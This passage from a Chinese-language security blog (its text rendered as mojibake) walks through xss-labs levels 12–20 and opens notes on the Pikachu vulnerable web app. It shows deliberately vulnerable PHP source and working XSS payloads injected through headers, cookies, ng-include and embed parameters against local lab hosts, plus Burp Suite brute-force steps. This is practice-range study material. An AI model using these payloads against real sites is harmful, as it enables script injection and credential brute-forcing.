class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨bpæŠ“åŒ…ï¼Œâ€ onmouseover&#x3D;alert(1) type&#x3D;â€textâ€     åŠ åˆ°user-Agentåé¢<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f2881b11012847a6b499cc12ee911ebf~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5bbdcc19f00c49c49ee56ff5cfcca46d~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="level13"><a href="#level13" class="headerlink" title="level13:"></a>level13:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level14.php&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level13<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level13<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str00 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str11=$_COOKIE[&quot;user&quot;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level13.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>bpæŠ“åŒ…ï¼Œcookieåé¢çš„å†…å®¹æ”¹ä¸ºï¼š<code>click here&quot;type=&quot;button&quot;onclick=&quot;javascript:alert(123)</code></li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/52990352b60e409bbb6c1ee2be55e9eb~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2c0549d6216943748f09fed8c362ad82~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="level14"><a href="#level14" class="headerlink" title="level14:"></a>level14:</h1><blockquote>
<p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œæ€»æ˜¯è·³åˆ°è¿™ä¸ªåœ°å€ </p>
</blockquote>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bfe2177460e940728e6b88068edf8994~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="level15"><a href="#level15" class="headerlink" title="level15:"></a>level15:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level15<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°ç¬¬15å…³ï¼Œè‡ªå·±æƒ³ä¸ªåŠæ³•èµ°å‡ºå»å§ï¼<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level15.png</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;src&quot;];</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">127.0.0.1/xss-labs-master/level15.php?src=&#x27;http://127.0.0.1/xss-labs-master/level1.php?name=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/41df86ed7da0439196b9191cd30593fc~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="level16"><a href="#level16" class="headerlink" title="level16:"></a>level16:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level16<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level16<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level16.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">127.0.0.1/xss-labs-master/level16.php?keyword=&lt;a%0Ahref=&#x27;javas%0Acript:alert(&quot;xss&quot;)&#x27;&gt;xss</span><br></pre></td></tr></table></figure>

<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2a31397d644b4055af689496170ef927~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="level17"><a href="#level17" class="headerlink" title="level17:"></a>level17:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level17<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level17<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æˆåŠŸåï¼Œ<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">level18.php?arg01</span>=<span class="string">a&amp;arg02</span>=<span class="string">b</span>&gt;</span>ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1bd104f874bd450591961f356d38bd14~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="level18"><a href="#level18" class="headerlink" title="level18:"></a>level18:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level19.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level18<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level18<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">127.0.0.1/xss-labs-master/level18.php?arg01=       onfoucs&amp;arg02=javascript:alert(123)</span><br></pre></td></tr></table></figure>
<ul>
<li>æ€ä¹ˆéƒ½å¼¹ä¸äº†çª—ï¼Œç™¾åº¦åï¼Œéœ€è¦ä½¿ç”¨IEæµè§ˆå™¨ï¼Œæˆ‘æ˜¯ç«ç‹ï¼Œæ²¡æœ‰IE<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç½‘ä¸Šæœçš„payload:</span><br></pre></td></tr></table></figure>
<code>http://192.168.132.132/xss-labs-master/level18.php?arg01=a&amp;arg02= onmouseover=alert(1)</code></li>
</ul>
<p><code>http://192.168.132.132/xss-labs-master/level18.php?arg01=a&amp;arg02= onmouseout=alert</code>1<code> </code></p>
<p><code>http://127.0.0.1/xss/level18.php?arg01= onfoucs&amp;arg02=javascript:alert(123)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># level19:</span><br><span class="line">```html</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;å®Œæˆçš„ä¸é”™ï¼&quot;);</span><br><span class="line"> window.location.href=&quot;level20.php?arg01=a&amp;arg02=b&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level19&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level19&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#x27;&lt;embed src=&quot;xsf03.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level20"><a href="#level20" class="headerlink" title="level20:"></a>level20:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level21.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level20<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level20<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;embed src=&quot;xsf04.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>åé¢çš„æ˜¯ä¸æ˜¯éƒ½éœ€è¦ç”¨IEæµè§ˆå™¨åšå“Ÿï¼Ÿæ€ä¹ˆå°±æ˜¯å¼¹çª—ä¸äº†ï¼Ÿ</li>
<li>å‚è€ƒé“¾æ¥ï¼š</li>
<li><a href="https://www.jianshu.com/p/4e3a517bc4ea">https://www.jianshu.com/p/4e3a517bc4ea</a></li>
<li><a href="https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_7">https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_7</a></li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>Pikachué¶åœºç¬”è®°</title>
    <url>/2022/10/01/Pikachu%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>Pikachuæ˜¯ä¸€ä¸ªå¸¦æœ‰æ¼æ´çš„Webåº”ç”¨ç³»ç»Ÿï¼Œåœ¨è¿™é‡ŒåŒ…å«äº†å¸¸è§çš„webå®‰å…¨æ¼æ´ã€‚ å¦‚æœä½ æ˜¯ä¸€ä¸ªWebæ¸—é€æµ‹è¯•å­¦ä¹ äººå‘˜ä¸”æ­£å‘æ„æ²¡æœ‰åˆé€‚çš„é¶åœºè¿›è¡Œç»ƒä¹ ï¼Œé‚£ä¹ˆPikachuå¯èƒ½æ­£åˆä½ æ„ã€‚</p>
</blockquote>
<h1 id="0x01-Burt-Force-æš´åŠ›ç ´è§£æ¼æ´"><a href="#0x01-Burt-Force-æš´åŠ›ç ´è§£æ¼æ´" class="headerlink" title="0x01 Burt Force(æš´åŠ›ç ´è§£æ¼æ´)"></a>0x01 Burt Force(æš´åŠ›ç ´è§£æ¼æ´)</h1><h2 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h2><p>ä¸€.å‡†å¤‡å­—å…¸</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/59ef53bd85b24b07998313396f440d2c~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"><br>äºŒ.ä½¿ç”¨burp suiteçˆ†ç ´</p>
<ul>
<li>æŠ“åŒ…</li>
</ul>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7da465b82f7d4d41ac4ae81bfbef6375~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<ul>
<li>ä½¿ç”¨intruderâ€“&gt;cluster bombæ¨¡å—çˆ†ç ´</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6184264fdb07428facdc3f0e858e8169~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47d9f3b8cb174b15a0434f36f6a734ab~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h2 id="éªŒè¯ç ç»•è¿‡-on-server"><a href="#éªŒè¯ç ç»•è¿‡-on-server" class="headerlink" title="éªŒè¯ç ç»•è¿‡(on server)"></a>éªŒè¯ç ç»•è¿‡(on server)</h2><ul>
<li>ä½¿ç”¨ brup suiteæŠ“åŒ…ï¼Œå¹¶å°†å…¶å‘é€åˆ° repeaterä¸­</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5d9cb50aff9447a9818ff75649717d1e~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9248185d41854b90a3f45dc2fadbea8d~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p>
<blockquote>
<p>è§‚å¯Ÿä¸Šé¢ä¸¤å¼ æŠ“åŒ…å›¾ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨åŒä¸€æ¬¡â€œæœªæ–­åŒ…â€(æˆ‘è‡ªå·±ç†è§£çš„è¯)çš„æƒ…å†µä¸‹ï¼Œæ”¹å˜ç”¨æˆ·åæˆ–å¯†ç å¯ä»¥ä¸æ›´æ”¹éªŒè¯ç ã€‚å³éªŒè¯ç æœªè¿‡æœŸã€‚çˆ†ç ´æ€è·¯åŒä¸Šã€‚</p>
</blockquote>
<h2 id="éªŒè¯ç ç»•è¿‡-on-client"><a href="#éªŒè¯ç ç»•è¿‡-on-client" class="headerlink" title="éªŒè¯ç ç»•è¿‡(on client)"></a>éªŒè¯ç ç»•è¿‡(on client)</h2><ul>
